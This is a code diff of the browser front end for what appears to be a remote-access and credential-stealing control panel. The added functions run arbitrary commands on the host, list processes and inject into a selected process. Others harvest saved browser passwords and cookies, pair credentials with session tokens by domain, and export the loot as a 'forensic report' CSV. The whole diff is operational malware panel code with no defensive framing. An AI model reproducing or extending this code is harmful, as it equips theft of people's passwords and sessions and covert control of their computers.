+            d.innerText = `[${new Date().toLocaleTimeString()}] ${m}`; 
+            const c = document.getElementById('console-out');
+            if(c){ 
+                c.appendChild(d); 
+                c.scrollTop = c.scrollHeight; 
+            }
+        };
+        
+        window.fetchProcs = async function() {
+            try {
+                const r = await fetch('/v1/sys/b2', {headers:{'X-Signal-Token':window.apiToken}}); 
+                const d = await r.json();
+                const b = document.getElementById('proc-body'); 
+                b.innerHTML = '';
+                d.sort((x,y)=>x.name.localeCompare(y.name)).forEach(p => {
+                    const tr = document.createElement('tr'); 
+                    tr.className = 'row-proc';
+                    tr.innerHTML = `<td style="font-family:monospace; color:#0a84ff;">${p.pid}</td><td>${p.name}</td><td>${p.user}</td><td style="font-family:monospace;">${p.mem}</td>`;
+                    tr.onclick = () => { 
+                        document.querySelectorAll('.row-proc').forEach(x=>x.classList.remove('selected')); 
+                        tr.classList.add('selected'); 
+                        window.selectedPid = p.pid; 
+                        document.getElementById('target-pid').value = p.pid; 
+                    };
+                    b.appendChild(tr);
                 });
-                addLog("Analysis complete.", "SUCCESS");
-            } catch(e) { addLog("Intel Error.", "ERROR"); }
+            } catch(e) {
+                window.log('Failed to fetch processes', 'ERROR');
+            }
+        };
+        
+        window.filterProcs = function() {
+            const v = document.getElementById('p-search').value.toLowerCase();
+            document.querySelectorAll('#proc-body tr').forEach(r => r.style.display = r.innerText.toLowerCase().includes(v) ? '' : 'none');
+        };
+        
+        window.runCmd = async function() {
+            const c = document.getElementById('cmd-in').value; 
+            if(!c) return; 
+            window.log('EXEC: '+c, 'INFO');
+            try {
+                const r = await fetch('/v1/sys/cmd', {
+                    method:'POST', 
+                    headers:{'X-Signal-Token':window.apiToken, 'Content-Type': 'application/json'}, 
+                    body:JSON.stringify({c})
+                }); 
+                const out = await r.text();
+                const co = document.getElementById('console-out'); 
+                co.innerHTML += `<div style="color:#0a84ff; margin-top:10px; font-weight:800; font-family:monospace;">> ${c}</div><pre style="color:#eee; font-size:12.5px; white-space:pre-wrap; margin:5px 0;">${out}</pre>`;
+                document.getElementById('cmd-in').value = ''; 
+                co.scrollTop = co.scrollHeight;
+            } catch(e) {
+                window.log('Command failed: ' + e, 'ERROR');
+            }
+        };
+        
+        window.extractIntel = async function() {
+            window.log('Extracting Passwords...', 'INFO'); 
+            if(document.getElementById('win-intel').style.display==='none') window.toggleWin('intel');
+            const head = document.getElementById('intel-head');
+            const body = document.getElementById('intel-body');
+            head.innerHTML = '<tr><th>APP</th><th>URL</th><th>USER</th><th>DATA</th></tr>';
+            body.innerHTML = '<tr><td colspan="4" style="text-align:center; padding:20px; color:#888;">Working...</td></tr>';
+            
+            try {
+                const r = await fetch('/v1/sys/a7', {headers:{'X-Signal-Token':window.apiToken}});
+                const d = await r.json();
+                body.innerHTML = '';
+                if(d.length === 0) body.innerHTML = '<tr><td colspan="4" style="text-align:center; color:#ff453a; padding:20px;">No data found or access denied.</td></tr>';
+                for(const e of d) {
+                    body.innerHTML += `<tr><td>${e.b}</td><td style="max-width:200px; overflow:hidden; text-overflow:ellipsis;">${e.u}</td><td>${e.s}</td><td style="color:#00ff41; font-weight:800; font-family:monospace;">${e.p}</td></tr>`;
+                }
+                window.log('Extraction Done: ' + d.length + ' items', 'SUCCESS');
+            } catch(e) { 
+                window.log('Fetch Error: ' + e, 'ERROR'); 
+                body.innerHTML = '<tr><td colspan="4" style="text-align:center; color:#ff453a; padding:20px;">Connection failed</td></tr>';
+            }
         };
 
-        document.getElementById('loadBtn').onclick = async () => {
-            const res = await fetch('/sync', { method: 'POST', body: JSON.stringify({pid: pidInput.value}) });
-            if (res.ok) addLog("SYNC OK.", "SUCCESS"); else addLog("SYNC FAILED.", "ERROR");
+        window.extractCookies = async function() {
+            window.log('Harvesting Cookies...', 'INFO'); 
+            if(document.getElementById('win-intel').style.display==='none') window.toggleWin('intel');
+            const head = document.getElementById('intel-head');
+            const body = document.getElementById('intel-body');
+            head.innerHTML = '<tr><th>APP</th><th>HOST</th><th>NAME</th><th>VALUE</th></tr>';
+            body.innerHTML = '<tr><td colspan="4" style="text-align:center; padding:20px; color:#888;">Working...</td></tr>';
+
+            try {
+                const r = await fetch('/v1/sys/cookies', {headers:{'X-Signal-Token':window.apiToken}});
+                const d = await r.json();
+                body.innerHTML = '';
+                if(d.length === 0) body.innerHTML = '<tr><td colspan="4" style="text-align:center; color:#ff453a; padding:20px;">No cookies found or database locked.</td></tr>';
+                for(const e of d) {
+                    body.innerHTML += `<tr><td>${e.b}</td><td style="color:#0a84ff;">${e.h}</td><td style="font-weight:600;">${e.n}</td><td style="color:#00ff41; max-width:300px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; font-family:monospace; font-size:11px;">${e.v}</td></tr>`;
+                }
+                window.log('Harvest Done: ' + d.length + ' cookies', 'SUCCESS');
+            } catch(e) { 
+                window.log('Fetch Error: ' + e, 'ERROR'); 
+                body.innerHTML = '<tr><td colspan="4" style="text-align:center; color:#ff453a; padding:20px;">Connection failed</td></tr>';
+            }
+        };
+        
+        window.extractNexus = async function() {
+            window.log('Analyzing Identity Nexus...', 'INFO'); 
+            if(document.getElementById('win-intel').style.display==='none') window.toggleWin('intel');
+            const head = document.getElementById('intel-head');
+            const body = document.getElementById('intel-body');
+            head.innerHTML = '<tr><th>DOMAIN</th><th>USER</th><th>PASSWORD</th><th>SESSION</th></tr>';
+            body.innerHTML = '<tr><td colspan="4" style="text-align:center; padding:20px; color:#888;">Correlating Bayesians...</td></tr>';
+            
+            try {
+                const r = await fetch('/v1/sys/nexus', {headers:{'X-Signal-Token':window.apiToken}});
+                const d = await r.json();
+                body.innerHTML = '';
+                const keys = Object.keys(d);
+                if(keys.length === 0) body.innerHTML = '<tr><td colspan="4" style="text-align:center; color:#ff453a; padding:20px;">No correlations found. Try extracting Passwords and Cookies first.</td></tr>';
+                for(const site in d) {
+                    const node = d[site];
+                    const isCritical = node.p && node.c;
+                    body.innerHTML += `<tr style="${isCritical?'background:rgba(255,69,58,0.1);':''}">
+                        <td style="color:${isCritical?'#ff453a':'#eee'}; font-weight:800;">${site}</td>
+                        <td>${node.u || 'N/A'}</td>
+                        <td style="color:${node.p?'#00ff41':'#666'}; font-family:monospace;">${node.p || 'MISSING'}</td>
+                        <td style="color:${node.c?'#ff9f0a':'#444'}; font-family:monospace; font-size:11px;">${node.c || 'INACTIVE'}</td>
+                    </tr>`;
+                }
+                window.log('Nexus Analysis Done: ' + keys.length + ' nodes', 'SUCCESS');
+            } catch(e) { 
+                window.log('Nexus Error: ' + e, 'ERROR'); 
+                body.innerHTML = '<tr><td colspan="4" style="text-align:center; color:#ff453a; padding:20px;">Analysis failed</td></tr>';
+            }
         };
 
-        // DRAGGABLE LOGIC RESTORED
-        document.querySelectorAll('.window').forEach(win => {
-            const hdr = win.querySelector('.window-header');
-            hdr.onmousedown = (e) => {
-                let sX = e.clientX - win.getBoundingClientRect().left;
-                let sY = e.clientY - win.getBoundingClientRect().top;
-                const move = (ev) => { win.style.left = (ev.pageX - sX) + 'px'; win.style.top = (ev.pageY - sY) + 'px'; };
-                document.addEventListener('mousemove', move);
-                document.onmouseup = () => { document.removeEventListener('mousemove', move); document.onmouseup = null; };
-            };
+        window.exportCSV = function() {
+            let csv = []; 
+            const rows = document.querySelectorAll('#win-intel tr');
+            for(let r of rows) { 
+                let cols = r.querySelectorAll('td, th'), cData = []; 
+                for(let c of cols) cData.push('"' + c.innerText.replace(/"/g, '""') + '"'); 
+                csv.push(cData.join(',')); 
+            }
+            const blob = new Blob([csv.join('\n')], {type:'text/csv'}), 
+                  url = window.URL.createObjectURL(blob), 
+                  a = document.createElement('a');
+            a.href = url; 
+            a.download = 'forensic_report_' + new Date().toISOString().slice(0,19).replace(/:/g,'-') + '.csv'; 
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            window.URL.revokeObjectURL(url);
+            window.log('CSV Exported', 'SUCCESS');
+        };
+        
+        window.applyTweaks = async function() { 
+            const o = document.getElementById('opt-log');
+            o.innerHTML += `<div style="color:#888">[${new Date().toLocaleTimeString()}] Initiating optimization sequence...</div>`;
+            try {
+                const r = await fetch('/v1/sys/opt', {headers:{'X-Signal-Token':window.apiToken}}); 
+                const d = await r.json(); 
+                d.forEach(x => o.innerHTML += `<div style="color:${x.includes('FAIL')?'#ff453a':'#00ff41'}; margin:2px 0;">▸ ${x}</div>`);
+                o.scrollTop = o.scrollHeight;
+                window.log('Optimization complete', 'SUCCESS');
+            } catch(e) {
+                o.innerHTML += `<div style="color:#ff453a">▸ FAILED: ${e}</div>`;
+                window.log('Optimization failed', 'ERROR');
+            }
+        };
+        
+        window.injectSignal = async function() {
+            if(!window.selectedPid) return window.log('Select PID first', 'ERROR');
+            window.log('Injecting Pulse into '+window.selectedPid, 'INFO');
+            try {
+                const r = await fetch('/v1/op/d4', {
+                    method:'POST', 
+                    headers:{'X-Signal-Token':window.apiToken, 'Content-Type': 'application/json'}, 
+                    body:JSON.stringify({pid:window.selectedPid})
+                });
+                if(r.ok) window.log('PULSE_SENT', 'SUCCESS'); 
+                else window.log('INJECTION_FAILED: ' + r.status, 'ERROR');
+            } catch(e) {
+                window.log('INJECTION_FAILED: ' + e, 'ERROR');
+            }
+        };
+        
+        // Click en ventana para traer al frente
+        document.querySelectorAll('.window').forEach(w => {
+            w.addEventListener('mousedown', function() {
+                document.querySelectorAll('.window').forEach(win => win.classList.remove('active'));
+                this.classList.add('active');
+                this.style.zIndex = ++window.clicks + 1000;
+            });
         });
-
-        function toggleApp(id) { const w = document.getElementById('win-'+id); w.style.display = w.style.display === 'flex' ? 'none' : 'flex'; }
-        function closeApp(id) { document.getElementById('win-'+id).style.display = 'none'; }
-        window.onload = () => { ['monitor', 'terminal', 'lab'].forEach(i => toggleApp(i)); refresh(); };
+        
+        // Reloj con formato macOS
+        setInterval(() => { 
+            const clock = document.getElementById('clock'); 
+            if(clock) {
+                const now = new Date();
+                const options = { 
+                    weekday: 'short', 
+                    month: 'short', 
+                    day: 'numeric', 
+                    hour: 'numeric', 
+                    minute: '2-digit',
+                    hour12: true 
+                };
+                clock.innerText = now.toLocaleString('en-US', options);
+            }
+        }, 1000);
+        
+        // Actualizar estado cada 30s
+        setInterval(() => {
+            if(document.getElementById('desktop').style.display === 'block') {
+                window.checkStatus();
+            }
+        }, 30000);
     </script>
 </body>
 </html>
